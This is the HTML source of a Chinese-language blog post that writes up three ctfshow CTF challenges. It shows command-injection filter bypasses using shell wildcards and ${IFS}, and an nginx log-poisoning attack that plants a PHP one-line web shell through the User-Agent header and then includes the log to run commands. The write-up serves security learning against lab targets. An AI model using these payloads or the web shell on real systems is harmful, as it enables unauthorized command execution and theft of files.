@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>ctfshow 命令执行web54 | l-y-fのblog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="题目来源：ctfshow 命令执行web54题目链接(https:&#x2F;&#x2F;4e4d73a5-78f5-4ff4-b9ed-6f7b903664cf.challenge.ctf.show&#x2F;)解题思路：启动靶机过滤分号、空格、反引号、%、Tab、&amp;、&gt;、&lt;，所有数字；子串顺序匹配利用.*通配符过滤cat、flag、more等20个命令关键词，且不区分大小写，这意味着关键词中间插入任意字">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow 命令执行web54">
+<meta property="og:url" content="https://l-y-f-f1111.github.io/2026/08/13/2026-08-13-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb54/index.html">
+<meta property="og:site_name" content="l-y-fのblog">
+<meta property="og:description" content="题目来源：ctfshow 命令执行web54题目链接(https:&#x2F;&#x2F;4e4d73a5-78f5-4ff4-b9ed-6f7b903664cf.challenge.ctf.show&#x2F;)解题思路：启动靶机过滤分号、空格、反引号、%、Tab、&amp;、&gt;、&lt;，所有数字；子串顺序匹配利用.*通配符过滤cat、flag、more等20个命令关键词，且不区分大小写，这意味着关键词中间插入任意字">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260813120605.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260813104400.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260813104734.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260813105929.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260813111930.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260813112437.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260813112547.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260813112856.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260813113737.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260813115102.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260813115248.png">
+<meta property="og:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260813115424.png">
+<meta property="article:published_time" content="2026-08-13T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-13T04:10:05.146Z">
+<meta property="article:author" content="l-y-f">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l-y-f-f1111.github.io/images/Pastedimage20260813120605.png">
+  
+    <link rel="alternate" href="/atom.xml" title="l-y-fのblog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">l-y-fのblog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://l-y-f-f1111.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2026-08-13-ctfshow 命令执行web54" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/08/13/2026-08-13-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb54/" class="article-date">
+  <time class="dt-published" datetime="2026-08-13T00:00:00.000Z" itemprop="datePublished">2026-08-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      ctfshow 命令执行web54
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>题目来源：ctfshow 命令执行web54<br>题目链接(<a target="_blank" rel="noopener" href="https://4e4d73a5-78f5-4ff4-b9ed-6f7b903664cf.challenge.ctf.show/">https://4e4d73a5-78f5-4ff4-b9ed-6f7b903664cf.challenge.ctf.show/</a>)<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260813120605.png"><br>过滤分号、空格、反引号、%、Tab、&amp;、&gt;、&lt;，所有数字；子串顺序匹配利用<code>.*</code>通配符过滤cat、flag、more等20个命令关键词，且不区分大小写，这意味着关键词中间插入任意字符仍会被匹配<br>先查看文件目录<code>?c=ls</code><br><img src="/images/Pastedimage20260813104400.png"></p>
+<h1 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h1><p><code>?c=/bin/ca?$&#123;IFS&#125;????.???</code><br><code>/bin/ca?</code> 会匹配 <code>/bin/cat</code>正则检查字符串中是否包含 <code>c→a→t</code> 顺序<code>/bin/ca?</code> 中只有 <code>c→a→?</code>，<code>?</code> 不是字母 <code>t</code>，所以不匹配过滤规则<br><code>$&#123;IFS&#125;</code>代替空格<br>当前目录只有两个文件，且一个是4+3字符，一个是5+3字符，所以可以直接用????.???来匹配<code>flag.php</code><br>这里<code>?c=ca?$&#123;IFS&#125;????.???</code>得不到flag<br>原因：<code>ca?</code> 没有指定路径，依赖 <code>$PATH</code> 搜索<code>$PATH</code> 可能包含多个目录，每个目录中可能都有以 <code>ca</code> 开头的3字符命令，可能匹配到多个结果，导致不确定性甚至报错，而 <code>/bin/ca?</code> 使用绝对路径明确指向 <code>/bin/</code> 目录，通配符展开更可靠。</p>
+<p><img src="/images/Pastedimage20260813104734.png"></p>
+<h1 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h1><p>mv是 Linux&#x2F;Unix 系统中的移动&#x2F;重命名命令，全称是move<br>重命名文件或目录，移动文件或目录<br><code>?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</code><br>将<code>flag.php</code> 重命名为 <code>a.txt</code><br>然后直接访问a.txt<br><img src="/images/Pastedimage20260813105929.png"></p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>题目来源：ctfshow 命令执行web55<br>题目链接(<a target="_blank" rel="noopener" href="https://d2b03460-7485-4e3d-8cf0-829802be9ca4.challenge.ctf.show/">https://d2b03460-7485-4e3d-8cf0-829802be9ca4.challenge.ctf.show/</a>)<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260813111930.png"><br>正则过滤掉了：分号 ;、所有字母 a-z、反引号 、百分号 %、制表符 \x09、与号 &amp;、大于号 &gt;、小于号 &lt;<br>因为正则只过滤了字母 a-z，但数字 0-9 没有被过滤，所以我们可以利用 <code>/bin/</code> 目录下那些以数字开头或包含数字的可执行程序来绕过字母限制<br><code>/bin/base64</code> 是 Linux 系统中的一个编码&#x2F;解码工具，用于将文件内容转换为 Base64 格式或从 Base64 还原为原始内容<br><code>?c=/bin/base64 flag.php</code>   <code>?c=/???/????64 ????.???</code><br><img src="/images/Pastedimage20260813112437.png"><br>解码<br><img src="/images/Pastedimage20260813112547.png"><br>得到flag</p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>题目来源：ctfshow 文件包含80<br>题目链接(<a target="_blank" rel="noopener" href="https://7459a09a-ef69-4077-ba5f-c7849fd2339a.challenge.ctf.show/">7459a09a-ef69-4077-ba5f-c7849fd2339a.challenge.ctf.show</a>)<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260813112856.png"><br>将 <code>&quot;php&quot;</code> 替换为 <code>&quot;???&quot;</code>  将 <code>&quot;data&quot;</code> 替换为 <code>&quot;???&quot;</code> 只替换一次，不递归处理<br><code>str_replace()</code> 区分大小写，可以使用 <code>PHP</code>、<code>pHp</code> 等绕过<br>但是伪协议里面规定了必须是小写，所以<code>data://</code>协议和<code>php://filter</code>协议都不可用<br>换个思路，考虑日志包含漏洞<br>抓包<br><img src="/images/Pastedimage20260813113737.png"><br>发现服务器是nginx 其默认日志路径为<code>/var/log/nginx/access.log</code><br>Nginx默认会将每个请求的UA记录到access.log中，所以修改UA头为一句话木马<br>修改为<code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code><br>实现：执行用户通过<code>cmd</code>参数传入的系统命令<br><img src="/images/Pastedimage20260813115102.png"></p>
+<p>查看文件目录<code>?file=/var/log/nginx/access.log&amp;cmd=ls</code><br>这是两个参数第一个参数是file它实现了包含日志文件，第二个参数是cmd它实现了传入命令<br>具体执行过程如下：<br>1.包含日志include(“&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log”);<br>2.日志中的代码被执行<code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code><br>3.<code>$_GET[&#39;cmd&#39;]</code> 的值是 “ls”执行system(“ls”);<br><img src="/images/Pastedimage20260813115248.png"><br>发现fl0g.php文件<br>同样通过cmd参数传入读取fl0g.php的命令<code>?file=/var/log/nginx/access.log&amp;cmd=cat fl0g.php</code><br><img src="/images/Pastedimage20260813115424.png"><br>得到flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://l-y-f-f1111.github.io/2026/08/13/2026-08-13-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb54/" data-id="cmsrbhbb5000098uy25uahq4c" data-title="ctfshow 命令执行web54" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2026/08/12/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">Hello World</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/08/">八月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/07/">七月 2026</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/08/13/2026-08-13-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb54/">ctfshow 命令执行web54</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/12/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/11/2026-08-11-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb52/">ctfshow 命令执行web52</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/10/2026-08-10-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb50/">ctfshow 命令执行web50</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/09/2026-08-09-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb47/">ctfshow 命令执行web47</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 l-y-f<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
